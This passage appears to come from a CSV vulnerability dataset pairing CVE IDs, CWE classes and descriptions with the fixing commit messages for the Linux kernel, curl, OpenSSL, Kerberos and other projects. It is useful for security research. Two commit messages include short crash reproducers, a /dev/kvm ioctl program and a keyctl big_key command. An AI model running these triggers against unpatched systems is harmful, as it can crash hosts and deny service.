./net/socket.c:1701  [<ffffffff817596ce>] SyS_connect+0xe/0x10 ./net/socket.c:1682  [<ffffffff818b0a29>] system_call_fastpath+0x16/0x1b ./arch/x86/kernel/entry_64.S:629  [2] <4>[196727.311203] general protection fault: 0000 [#1] SMP <4>[196727.311224] Modules linked in: xt_TEE xt_dscp xt_DSCP macvlan bridge coretemp crc32_pclmul ghash_clmulni_intel gpio_ich microcode ipmi_watchdog ipmi_devintf sb_edac edac_core lpc_ich mfd_core tpm_tis tpm tpm_bios ipmi_si ipmi_msghandler isci igb libsas i2c_algo_bit ixgbe ptp pps_core mdio <4>[196727.311333] CPU: 17 PID: 0 Comm: swapper/17 Not tainted 3.10.26 #1 <4>[196727.311344] Hardware name: Supermicro X9DRi-LN4+/X9DR3-LN4+/X9DRi-LN4+/X9DR3-LN4+, BIOS 3.0 07/05/2013 <4>[196727.311364] task: ffff885e6f069700 ti: ffff885e6f072000 task.ti: ffff885e6f072000 <4>[196727.311377] RIP: 0010:[<ffffffff815f8c7f>]  [<ffffffff815f8c7f>] ipv4_dst_destroy+0x4f/0x80 <4>[196727.311399] RSP: 0018:ffff885effd23a70  EFLAGS: 00010282 <4>[196727.311409] RAX: dead000000200200 RBX: ffff8854c398ecc0 RCX: 0000000000000040 <4>[196727.311423] RDX: dead000000100100 RSI: dead000000100100 RDI: dead000000200200 <4>[196727.311437] RBP: ffff885effd23a80 R08: ffffffff815fd9e0 R09: ffff885d5a590800 <4>[196727.311451] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000 <4>[196727.311464] R13: ffffffff81c8c280 R14: 0000000000000000 R15: ffff880e85ee16ce <4>[196727.311510] FS:  0000000000000000(0000) GS:ffff885effd20000(0000) knlGS:0000000000000000 <4>[196727.311554] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 <4>[196727.311581] CR2: 00007a46751eb000 CR3: 0000005e65688000 CR4: 00000000000407e0 <4>[196727.311625] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 <4>[196727.311669] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 <4>[196727.311713] Stack: <4>[196727.311733]  ffff8854c398ecc0 ffff8854c398ecc0 ffff885effd23ab0 ffffffff815b7f42 <4>[196727.311784]  ffff88be6595bc00 ffff8854c398ecc0 0000000000000000 ffff8854c398ecc0 <4>[196727.311834]  ffff885effd23ad0 ffffffff815b86c6 ffff885d5a590800 ffff8816827821c0 <4>[196727.311885] Call Trace: <4>[196727.311907]  <IRQ> <4>[196727.311912]  [<ffffffff815b7f42>] dst_destroy+0x32/0xe0 <4>[196727.311959]  [<ffffffff815b86c6>] dst_release+0x56/0x80 <4>[196727.311986]  [<ffffffff81620bd5>] tcp_v4_do_rcv+0x2a5/0x4a0 <4>[196727.312013]  [<ffffffff81622b5a>] tcp_v4_rcv+0x7da/0x820 <4>[196727.312041]  [<ffffffff815fd9e0>] ? ip_rcv_finish+0x360/0x360 <4>[196727.312070]  [<ffffffff815de02d>] ? nf_hook_slow+0x7d/0x150 <4>[196727.312097]  [<ffffffff815fd9e0>] ? ip_rcv_finish+0x360/0x360 <4>[196727.312125]  [<ffffffff815fda92>] ip_local_deliver_finish+0xb2/0x230 <4>[196727.312154]  [<ffffffff815fdd9a>] ip_local_deliver+0x4a/0x90 <4>[196727.312183]  [<ffffffff815fd799>] ip_rcv_finish+0x119/0x360 <4>[196727.312212]  [<ffffffff815fe00b>] ip_rcv+0x22b/0x340 <4>[196727.312242]  [<ffffffffa0339680>] ? macvlan_broadcast+0x160/0x160 [macvlan] <4>[196727.312275]  [<ffffffff815b0c62>] __netif_receive_skb_core+0x512/0x640 <4>[196727.312308]  [<ffffffff811427fb>] ? kmem_cache_alloc+0x13b/0x150 <4>[196727.312338]  [<ffffffff815b0db1>] __netif_receive_skb+0x21/0x70 <4>[196727.312368]  [<ffffffff815b0fa1>] netif_receive_skb+0x31/0xa0 <4>[196727.312397]  [<ffffffff815b1ae8>] napi_gro_receive+0xe8/0x140 <4>[196727.312433]  [<ffffffffa00274f1>] ixgbe_poll+0x551/0x11f0 [ixgbe] <4>[196727.312463]  [<ffffffff815fe00b>] ? ip_rcv+0x22b/0x340 <4>[196727.312491]  [<ffffffff815b1691>] net_rx_action+0x111/0x210 <4>[196727.312521]  [<ffffffff815b0db1>] ? __netif_receive_skb+0x21/0x70 <4>[196727.312552]  [<ffffffff810519d0>] __do_softirq+0xd0/0x270 <4>[196727.312583]  [<ffffffff816cef3c>] call_softirq+0x1c/0x30 <4>[196727.312613]  [<ffffffff81004205>] do_softirq+0x55/0x90 <4>[196727.312640]  [<ffffffff81051c85>] irq_exit+0x55/0x60 <4>[196727.312668]  [<ffffffff816cf5c3>] do_IRQ+0x63/0xe0 <4>[196727.312696]  [<ffffffff816c5aaa>] common_interrupt+0x6a/0x6a <4>[196727.312722]  <EOI> <1>[196727.313071] RIP  [<ffffffff815f8c7f>] ipv4_dst_destroy+0x4f/0x80 <4>[196727.313100]  RSP <ffff885effd23a70> <4>[196727.313377] ---[ end trace 64b3f14fae0f2e29 ]--- <0>[196727.380908] Kernel panic - not syncing: Fatal exception in interrupt  Reported-by: Alexey Preobrazhensky <preobr@google.com> Reported-by: dormando <dormando@rydia.ne> Signed-off-by: Eric Dumazet <edumazet@google.com> Fixes: 8141ed9 (""ipv4: Add a socket release callback for datagram sockets"") Cc: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2011-1180,CWE-787,2013-06-08,Multiple stack-based buffer overflows in the iriap_getvaluebyclass_indication function in net/irda/iriap.c in the Linux kernel before 2.6.39 allow remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging connectivity to an IrDA infrared network and sending a large integer value for a (1) name length or (2) attribute length.,Length fields provided by a peer for names and attributes may be longer than the destination array sizes.  Validate lengths to prevent stack buffer overflows.  Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2018-16658,CWE-200,2018-09-07,An issue was discovered in the Linux kernel before 4.18.6. An information leak in cdrom_ioctl_drive_status in drivers/cdrom/cdrom.c could be used by local attackers to read kernel memory because a cast from unsigned long to int interferes with bounds checking. This is similar to CVE-2018-10940.,"Like d88b6d0: ""cdrom: information leak in cdrom_ioctl_media_changed()""  There is another cast from unsigned long to int which causes a bounds check to fail with specially crafted input. The value is then used as an index in the slot array in cdrom_slot_status().  Signed-off-by: Scott Bauer <scott.bauer@intel.com> Signed-off-by: Scott Bauer <sbauer@plzdonthack.me> Cc: stable@vger.kernel.org Signed-off-by: Jens Axboe <axboe@kernel.dk>"
CVE-2013-7441,CWE-399,2015-05-29,The modern style negotiation in Network Block Device (nbd-server) 2.9.22 through 3.3 allows remote attackers to cause a denial of service (root process termination) by (1) closing the connection during negotiation or (2) specifying a name for a non-existent export.,"Previously, the modern style negotiation was carried out in the root server (listener) process before forking the actual client handler. This made it possible for a malfunctioning or evil client to terminate the root process simply by querying a non-existent export or aborting in the middle of the negotation process (caused SIGPIPE in the server).  This commit moves the negotiation process to the child to keep the root process up and running no matter what happens during the negotiation.  See http://sourceforge.net/mailarchive/message.php?msg_id=30410146  Signed-off-by: Tuomas Räsänen <tuomasjjrasanen@tjjr.fi>"
CVE-2017-12668,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WritePCXImage in coders/pcx.c.,
CVE-2015-5296,CWE-20,2015-12-29,"Samba 3.x and 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3 supports connections that are encrypted but unsigned, which allows man-in-the-middle attackers to conduct encrypted-to-unencrypted downgrade attacks by modifying the client-server data stream, related to clidfs.c, libsmb_server.c, and smbXcli_base.c.",
CVE-2018-19824,CWE-416,2018-12-03,"In the Linux kernel through 4.19.6, a local user could exploit a use-after-free in the ALSA driver by supplying a malicious USB Sound device (with zero interfaces) that is mishandled in usb_audio_probe in sound/usb/card.c.","If a USB sound card reports 0 interfaces, an error condition is triggered and the function usb_audio_probe errors out. In the error path, there was a use-after-free vulnerability where the memory object of the card was first freed, followed by a decrement of the number of active chips. Moving the decrement above the atomic_dec fixes the UAF.  [ The original problem was introduced in 3.1 kernel, while it was   developed in a different form.  The Fixes tag below indicates the   original commit but it doesn't mean that the patch is applicable   cleanly. -- tiwai ]  Fixes: 362e4e4 (""ALSA: usb-audio - clear chip->probing on error exit"") Reported-by: Hui Peng <benquike@gmail.com> Reported-by: Mathias Payer <mathias.payer@nebelwelt.net> Signed-off-by: Hui Peng <benquike@gmail.com> Signed-off-by: Mathias Payer <mathias.payer@nebelwelt.net> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2016-4356,CWE-119,2016-06-13,The append_utf8_value function in the DN decoder (dn.c) in Libksba before 1.3.3 allows remote attackers to cause a denial of service (out-of-bounds read) by clearing the high bit of the byte after invalid utf-8 encoded data.,
CVE-2013-2174,CWE-119,2013-07-31,"Heap-based buffer overflow in the curl_easy_unescape function in lib/escape.c in cURL and libcurl 7.7 through 7.30.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted string ending in a ""%"" (percent) character.","Security problem: CVE-2013-2174  If a program would give a string like ""%FF"" to curl_easy_unescape() but ask for it to decode only the first byte, it would still parse and decode the full hex sequence. The function then not only read beyond the allowed buffer but it would also deduct the *unsigned* counter variable for how many more bytes there's left to read in the buffer by two, making the counter wrap. Continuing this, the function would go on reading beyond the buffer and soon writing beyond the allocated target buffer...  Bug: http://curl.haxx.se/docs/adv_20130622.html Reported-by: Timo Sirainen"
CVE-2015-8787,CWE-476,2016-02-08,"The nf_nat_redirect_ipv4 function in net/netfilter/nf_nat_redirect.c in the Linux kernel before 4.4 allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by sending certain IPv4 packets to an incompletely configured interface, a related issue to CVE-2003-1604.","Commit 8b13edd (""netfilter: refactor NAT redirect IPv4 to use it from nf_tables"") has introduced a trivial logic change which can result in the following crash.  BUG: unable to handle kernel NULL pointer dereference at 0000000000000030 IP: [<ffffffffa033002d>] nf_nat_redirect_ipv4+0x2d/0xa0 [nf_nat_redirect] PGD 3ba662067 PUD 3ba661067 PMD 0 Oops: 0000 [#1] SMP Modules linked in: ipv6(E) xt_REDIRECT(E) nf_nat_redirect(E) xt_tcpudp(E) iptable_nat(E) nf_conntrack_ipv4(E) nf_defrag_ipv4(E) nf_nat_ipv4(E) nf_nat(E) nf_conntrack(E) ip_tables(E) x_tables(E) binfmt_misc(E) xfs(E) libcrc32c(E) evbug(E) evdev(E) psmouse(E) i2c_piix4(E) i2c_core(E) acpi_cpufreq(E) button(E) ext4(E) crc16(E) jbd2(E) mbcache(E) dm_mirror(E) dm_region_hash(E) dm_log(E) dm_mod(E) CPU: 0 PID: 2536 Comm: ip Tainted: G            E   4.1.7-15.23.amzn1.x86_64 #1 Hardware name: Xen HVM domU, BIOS 4.2.amazon 05/06/2015 task: ffff8800eb438000 ti: ffff8803ba664000 task.ti: ffff8803ba664000 [...] Call Trace:  <IRQ>  [<ffffffffa0334065>] redirect_tg4+0x15/0x20 [xt_REDIRECT]  [<ffffffffa02e2e99>] ipt_do_table+0x2b9/0x5e1 [ip_tables]  [<ffffffffa0328045>] iptable_nat_do_chain+0x25/0x30 [iptable_nat]  [<ffffffffa031777d>] nf_nat_ipv4_fn+0x13d/0x1f0 [nf_nat_ipv4]  [<ffffffffa0328020>] ? iptable_nat_ipv4_fn+0x20/0x20 [iptable_nat]  [<ffffffffa031785e>] nf_nat_ipv4_in+0x2e/0x90 [nf_nat_ipv4]  [<ffffffffa03280a5>] iptable_nat_ipv4_in+0x15/0x20 [iptable_nat]  [<ffffffff81449137>] nf_iterate+0x57/0x80  [<ffffffff814491f7>] nf_hook_slow+0x97/0x100  [<ffffffff814504d4>] ip_rcv+0x314/0x400  unsigned int nf_nat_redirect_ipv4(struct sk_buff *skb, ... { ... 		rcu_read_lock(); 		indev = __in_dev_get_rcu(skb->dev); 		if (indev != NULL) { 			ifa = indev->ifa_list; 			newdst = ifa->ifa_local; <--- 		} 		rcu_read_unlock(); ... }  Before the commit, 'ifa' had been always checked before access. After the commit, however, it could be accessed even if it's NULL. Interestingly, this was once fixed in 2003.  http://marc.info/?l=netfilter-devel&m=106668497403047&w=2  In addition to the original one, we have seen the crash when packets that need to be redirected somehow arrive on an interface which hasn't been yet fully configured.  This change just reverts the logic to the old behavior to avoid the crash.  Fixes: 8b13edd (""netfilter: refactor NAT redirect IPv4 to use it from nf_tables"") Signed-off-by: Munehisa Kamata <kamatam@amazon.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2011-3209,CWE-189,2012-10-03,The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.,"x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Signed-off-by: Roman Zippel <zippel@linux-m68k.org> Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-2696,CWE-18,2015-11-09,"lib/gssapi/krb5/iakerb.c in MIT Kerberos 5 (aka krb5) before 1.14 relies on an inappropriate context handle, which allows remote attackers to cause a denial of service (incorrect pointer read and process crash) via a crafted IAKERB packet that is mishandled during a gss_inquire_context call.","The IAKERB mechanism currently replaces its context handle with the krb5 mechanism handle upon establishment, under the assumption that most GSS functions are only called after context establishment.  This assumption is incorrect, and can lead to aliasing violations for some programs.  Maintain the IAKERB context structure after context establishment and add new IAKERB entry points to refer to it with that type.  Add initiate and established flags to the IAKERB context structure for use in gss_inquire_context() prior to context establishment.  CVE-2015-2696:  In MIT krb5 1.9 and later, applications which call gss_inquire_context() on a partially-established IAKERB context can cause the GSS-API library to read from a pointer using the wrong type, generally causing a process crash.  Java server applications using the native JGSS provider are vulnerable to this bug.  A carefully crafted IAKERB packet might allow the gss_inquire_context() call to succeed with attacker-determined results, but applications should not make access control decisions based on gss_inquire_context() results prior to context establishment.      CVSSv2 Vector: AV:N/AC:M/Au:N/C:N/I:N/A:C/E:POC/RL:OF/RC:C  [ghudson@mit.edu: several bugfixes, style changes, and edge-case behavior changes; commit message and CVE description]  ticket: 8244 target_version: 1.14 tags: pullup"
CVE-2018-8087,CWE-772,2018-03-13,Memory leak in the hwsim_new_radio_nl function in drivers/net/wireless/mac80211_hwsim.c in the Linux kernel through 4.15.9 allows local users to cause a denial of service (memory consumption) by triggering an out-of-array error case.,"'hwname' is malloced in hwsim_new_radio_nl() and should be freed before leaving from the error handling cases, otherwise it will cause memory leak.  Fixes: ff4dd73 (""mac80211_hwsim: check HWSIM_ATTR_RADIO_NAME length"") Signed-off-by: Wei Yongjun <weiyongjun1@huawei.com> Reviewed-by: Ben Hutchings <ben.hutchings@codethink.co.uk> Signed-off-by: Johannes Berg <johannes.berg@intel.com>"
CVE-2012-1583,CWE-399,2012-06-16,"Double free vulnerability in the xfrm6_tunnel_rcv function in net/ipv6/xfrm6_tunnel.c in the Linux kernel before 2.6.22, when the xfrm6_tunnel module is enabled, allows remote attackers to cause a denial of service (panic) via crafted IPv6 packets.",From: Eric Sesterhenn <snakebyte@gmx.de>  Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2016-6307,CWE-400,2016-09-26,"The state-machine implementation in OpenSSL 1.1.0 before 1.1.0a allocates memory before checking for an excessive length, which might allow remote attackers to cause a denial of service (memory consumption) via crafted TLS messages, related to statem/statem.c and statem/statem_lib.c.",
CVE-2016-9313,CWE-476,2016-11-28,"security/keys/big_key.c in the Linux kernel before 4.8.7 mishandles unsuccessful crypto registration in conjunction with successful key-type registration, which allows local users to cause a denial of service (NULL pointer dereference and panic) or possibly have unspecified other impact via a crafted application that uses the big_key data type.","big_key has two separate initialisation functions, one that registers the key type and one that registers the crypto.  If the key type fails to register, there's no problem if the crypto registers successfully because there's no way to reach the crypto except through the key type.  However, if the key type registers successfully but the crypto does not, big_key_rng and big_key_blkcipher may end up set to NULL - but the code neither checks for this nor unregisters the big key key type.  Furthermore, since the key type is registered before the crypto, it is theoretically possible for the kernel to try adding a big_key before the crypto is set up, leading to the same effect.  Fix this by merging big_key_crypto_init() and big_key_init() and calling the resulting function late.  If they're going to be encrypted, we shouldn't be creating big_keys before we have the facilities to do the encryption available.  The key type registration is also moved after the crypto initialisation.  The fix also includes message printing on failure.  If the big_key type isn't correctly set up, simply doing:  	dd if=/dev/zero bs=4096 count=1 | keyctl padd big_key a @s  ought to cause an oops.  Fixes: 13100a7 ('Security: Keys: Big keys stored encrypted') Signed-off-by: David Howells <dhowells@redhat.com> cc: Peter Hlavaty <zer0mem@yahoo.com> cc: Kirill Marinushkin <k.marinushkin@gmail.com> cc: Artem Savkov <asavkov@redhat.com> cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2012-1601,CWE-399,2012-05-17,The KVM implementation in the Linux kernel before 3.3.6 allows host OS users to cause a denial of service (NULL pointer dereference and host OS crash) by making a KVM_CREATE_IRQCHIP ioctl call after a virtual CPU already exists.,"(cherry picked from commit 3e51570)  If some vcpus are created before KVM_CREATE_IRQCHIP, then irqchip_in_kernel() and vcpu->arch.apic will be inconsistent, leading to potential NULL pointer dereferences.  Fix by: - ensuring that no vcpus are installed when KVM_CREATE_IRQCHIP is called - ensuring that a vcpu has an apic if it is installed after KVM_CREATE_IRQCHIP  This is somewhat long winded because vcpu->arch.apic is created without kvm->lock held.  Based on earlier patch by Michael Ellerman.  Signed-off-by: Michael Ellerman <michael@ellerman.id.au> Signed-off-by: Avi Kivity <avi@redhat.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2013-2094,CWE-189,2013-05-14,"The perf_swevent_init function in kernel/events/core.c in the Linux kernel before 3.8.9 uses an incorrect integer data type, which allows local users to gain privileges via a crafted perf_event_open system call.","Trinity discovered that we fail to check all 64 bits of attr.config passed by user space, resulting to out-of-bounds access of the perf_swevent_enabled array in sw_perf_event_destroy().  Introduced in commit b0a873e (""perf: Register PMU implementations"").  Signed-off-by: Tommi Rantala <tt.rantala@gmail.com> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Cc: davej@redhat.com Cc: Paul Mackerras <paulus@samba.org> Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Link: http://lkml.kernel.org/r/1365882554-30259-1-git-send-email-tt.rantala@gmail.com Signed-off-by: Ingo Molnar <mingo@kernel.org>"
CVE-2017-15306,CWE-476,2017-11-06,The kvm_vm_ioctl_check_extension function in arch/powerpc/kvm/powerpc.c in the Linux kernel before 4.13.11 allows local users to cause a denial of service (NULL pointer dereference and system crash) via a KVM_CHECK_EXTENSION KVM_CAP_PPC_HTM ioctl call to /dev/kvm.,"The following program causes a kernel oops:  #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <sys/ioctl.h> #include <linux/kvm.h>  main() {     int fd = open(""/dev/kvm"", O_RDWR);     ioctl(fd, KVM_CHECK_EXTENSION, KVM_CAP_PPC_HTM); }  This happens because when using the global KVM fd with KVM_CHECK_EXTENSION, kvm_vm_ioctl_check_extension() gets called with a NULL kvm argument, which gets dereferenced in is_kvmppc_hv_enabled(). Spotted while reading the code.  Let's use the hv_enabled fallback variable, like everywhere else in this function.  Fixes: 23528bb (""KVM: PPC: Introduce KVM_CAP_PPC_HTM"") Cc: stable@vger.kernel.org # v4.7+ Signed-off-by: Greg Kurz <groug@kaod.org> Reviewed-by: David Gibson <david@gibson.dropbear.id.au> Reviewed-by: Thomas Huth <thuth@redhat.com> Signed-off-by: Paul Mackerras <paulus@ozlabs.org>"
CVE-2019-14981,CWE-369,2019-08-12,"In ImageMagick 7.x before 7.0.8-41 and 6.x before 6.9.10-41, there is a divide-by-zero vulnerability in the MeanShiftImage function. It allows an attacker to cause a denial of service by sending a crafted file.",
CVE-2012-4467,CWE-399,2012-10-10,"The (1) do_siocgstamp and (2) do_siocgstampns functions in net/socket.c in the Linux kernel before 3.5.4 use an incorrect argument order, which allows local users to obtain sensitive information from kernel memory or cause a denial of service (system crash) via a crafted ioctl call.","Commit 644595f (""compat: Handle COMPAT_USE_64BIT_TIME in net/socket.c"") introduced a bug where the helper functions to take either a 64-bit or compat time[spec|val] got the arguments in the wrong order, passing the kernel stack pointer off as a user pointer (and vice versa).  Because of the user address range check, that in turn then causes an EFAULT due to the user pointer range checking failing for the kernel address.  Incorrectly resuling in a failed system call for 32-bit processes with a 64-bit kernel.  On odder architectures like HP-PA (with separate user/kernel address spaces), it can be used read kernel memory.  Signed-off-by: Mikulas Patocka <mpatocka@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2019-15920,CWE-416,2019-09-04,"An issue was discovered in the Linux kernel before 5.0.10. SMB2_read in fs/cifs/smb2pdu.c has a use-after-free. NOTE: this was not fixed correctly in 5.0.10; see the 5.0.11 ChangeLog, which documents a memory leak.","There is a KASAN use-after-free: BUG: KASAN: use-after-free in SMB2_read+0x1136/0x1190 Read of size 8 at addr ffff8880b4e45e50 by task ln/1009  Should not release the 'req' because it will use in the trace.  Fixes: eccb442 (""smb3: Add ftrace tracepoints for improved SMB3 debugging"")  Signed-off-by: ZhangXiaoxu <zhangxiaoxu5@huawei.com> Signed-off-by: Steve French <stfrench@microsoft.com> CC: Stable <stable@vger.kernel.org> 4.18+ Reviewed-by: Pavel Shilovsky <pshilov@microsoft.com>"
CVE-2017-12146,CWE-362,2017-09-08,The driver_override implementation in drivers/base/platform.c in the Linux kernel before 4.12.1 allows local users to gain privileges by leveraging a race condition between a read operation and a store operation that involve different overrides.,"The driver_override implementation is susceptible to race condition when different threads are reading vs storing a different driver override. Add locking to avoid race condition.  Fixes: 3d713e0 (""driver core: platform: add device binding path 'driver_override'"") Cc: stable@vger.kernel.org Signed-off-by: Adrian Salido <salidoa@google.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2014-8172,CWE-17,2015-03-16,"The filesystem implementation in the Linux kernel before 3.13 performs certain operations on lists of files with an inappropriate locking approach, which allows local users to cause a denial of service (soft lockup or system crash) via unspecified use of Asynchronous I/O (AIO) operations.",The only thing we need it for is alt-sysrq-r (emergency remount r/o) and these days we can do just as well without going through the list of files.  Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>
CVE-2017-14106,CWE-369,2017-09-01,The tcp_disconnect function in net/ipv4/tcp.c in the Linux kernel before 4.12 allows local users to cause a denial of service (__tcp_select_window divide-by-zero error and system crash) by triggering a disconnect within a certain tcp_recvmsg code path.,"When tcp_disconnect() is called, inet_csk_delack_init() sets icsk->icsk_ack.rcv_mss to 0. This could potentially cause tcp_recvmsg() => tcp_cleanup_rbuf() => __tcp_select_window() call path to have division by 0 issue. So this patch initializes rcv_mss to TCP_MIN_MSS instead of 0.  Reported-by: Andrey Konovalov  <andreyknvl@google.com> Signed-off-by: Wei Wang <weiwan@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: Neal Cardwell <ncardwell@google.com> Signed-off-by: Yuchung Cheng <ycheng@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-8858,CWE-399,2016-12-09,"The kex_input_kexinit function in kex.c in OpenSSH 6.x and 7.x through 7.3 allows remote attackers to cause a denial of service (memory consumption) by sending many duplicate KEXINIT requests.  NOTE: a third party reports that ""OpenSSH upstream does not consider this as a security issue.""",Unregister the KEXINIT handler after message has been received. Otherwise an unauthenticated peer can repeat the KEXINIT and cause allocation of up to 128MB -- until the connection is closed. Reported by shilei-c at 360.cn  Upstream-ID: 43649ae12a27ef94290db16d1a98294588b75c05
CVE-2016-0701,CWE-200,2016-02-15,"The DH_check_pub_key function in crypto/dh/dh_check.c in OpenSSL 1.0.2 before 1.0.2f does not ensure that prime numbers are appropriate for Diffie-Hellman (DH) key exchange, which makes it easier for remote attackers to discover a private DH exponent by making multiple handshakes with a peer that chose an inappropriate number, as demonstrated by a number in an X9.42 file.",
CVE-2017-7645,CWE-20,2017-04-18,"The NFSv2/NFSv3 server in the nfsd subsystem in the Linux kernel through 4.10.11 allows remote attackers to cause a denial of service (system crash) via a long RPC reply, related to net/sunrpc/svc.c, fs/nfsd/nfs3xdr.c, and fs/nfsd/nfsxdr.c.","A client can append random data to the end of an NFSv2 or NFSv3 RPC call without our complaining; we'll just stop parsing at the end of the expected data and ignore the rest.  Encoded arguments and replies are stored together in an array of pages, and if a call is too large it could leave inadequate space for the reply.  This is normally OK because NFS RPC's typically have either short arguments and long replies (like READ) or long arguments and short replies (like WRITE).  But a client that sends an incorrectly long reply can violate those assumptions.  This was observed to cause crashes.  Also, several operations increment rq_next_page in the decode routine before checking the argument size, which can leave rq_next_page pointing well past the end of the page array, causing trouble later in svc_free_pages.  So, following a suggestion from Neil Brown, add a central check to enforce our expectation that no NFSv2/v3 call has both a large call and a large reply.  As followup we may also want to rewrite the encoding routines to check more carefully that they aren't running off the end of the page array.  We may also consider rejecting calls that have any extra garbage appended.  That would be safer, and within our rights by spec, but given the age of our server and the NFS protocol, and the fact that we've never enforced this before, we may need to balance that against the possibility of breaking some oddball client.  Reported-by: Tuomas Haanpää <thaan@synopsys.com> Reported-by: Ari Kauppi <ari@synopsys.com> Cc: stable@vger.kernel.org Reviewed-by: NeilBrown <neilb@suse.com> Signed-off-by: J. Bruce Fields <bfields@redhat.com>"
CVE-2017-14057,CWE-834,2017-08-31,"In FFmpeg 3.3.3, a DoS in asf_read_marker() due to lack of an EOF (End of File) check might cause huge CPU and memory consumption. When a crafted ASF file, which claims a large ""name_len"" or ""count"" field in the header but does not contain sufficient backing data, is provided, the loops over the name and markers would consume huge CPU and memory resources, since there is no EOF check inside these loops.",Fixes: loop.asf  Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2012-0957,CWE-16,2012-12-21,The override_release function in kernel/sys.c in the Linux kernel before 3.4.16 allows local users to obtain sensitive information from kernel stack memory via a uname system call in conjunction with a UNAME26 personality.,"Calling uname() with the UNAME26 personality set allows a leak of kernel stack contents.  This fixes it by defensively calculating the length of copy_to_user() call, making the len argument unsigned, and initializing the stack buffer to zero (now technically unneeded, but hey, overkill).  CVE-2012-0957  Reported-by: PaX Team <pageexec@freemail.hu> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: Andi Kleen <ak@linux.intel.com> Cc: PaX Team <pageexec@freemail.hu> Cc: Brad Spengler <spender@grsecurity.net> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-3119,,2016-03-26,"The process_db_args function in plugins/kdb/ldap/libkdb_ldap/ldap_principal2.c in the LDAP KDB module in kadmind in MIT Kerberos 5 (aka krb5) through 1.13.4 and 1.14.x through 1.14.1 mishandles the DB argument, which allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted request to modify a principal.","In the LDAP KDB module's process_db_args(), strtok_r() may return NULL if there is an empty string in the db_args array.  Check for this case and avoid dereferencing a null pointer.  CVE-2016-3119:  In MIT krb5 1.6 and later, an authenticated attacker with permission to modify a principal entry can cause kadmind to dereference a null pointer by supplying an empty DB argument to the modify_principal command, if kadmind is configured to use the LDAP KDB module.      CVSSv2 Vector: AV:N/AC:H/Au:S/C:N/I:N/A:C/E:H/RL:OF/RC:ND  ticket: 8383 (new) target_version: 1.14-next target_version: 1.13-next tags: pullup"
CVE-2012-0044,CWE-190,2012-05-17,Integer overflow in the drm_mode_dirtyfb_ioctl function in drivers/gpu/drm/drm_crtc.c in the Direct Rendering Manager (DRM) subsystem in the Linux kernel before 3.1.5 allows local users to gain privileges or cause a denial of service (memory corruption) via a crafted ioctl call.,"There is a potential integer overflow in drm_mode_dirtyfb_ioctl() if userspace passes in a large num_clips.  The call to kmalloc would allocate a small buffer, and the call to fb->funcs->dirty may result in a memory corruption.  Reported-by: Haogang Chen <haogangchen@gmail.com> Signed-off-by: Xi Wang <xi.wang@gmail.com> Cc: stable@kernel.org Signed-off-by: Dave Airlie <airlied@redhat.com>"
CVE-2016-9540,CWE-119,2016-11-22,"tools/tiffcp.c in libtiff 4.0.6 has an out-of-bounds write on tiled images with odd tile width versus image width. Reported as MSVR 35103, aka ""cpStripToTile heap-buffer-overflow.""",tile width vs image width. Reported as MSVR 35103 by Axel Souchet and Vishal Chauhan from the MSRC Vulnerabilities & Mitigations team.
CVE-2017-15931,CWE-125,2017-10-27,"In radare2 2.0.1, an integer exception (negative number leading to an invalid memory access) exists in store_versioninfo_gnu_verneed() in libr/bin/format/elf/elf.c via crafted ELF files on 32bit systems.",
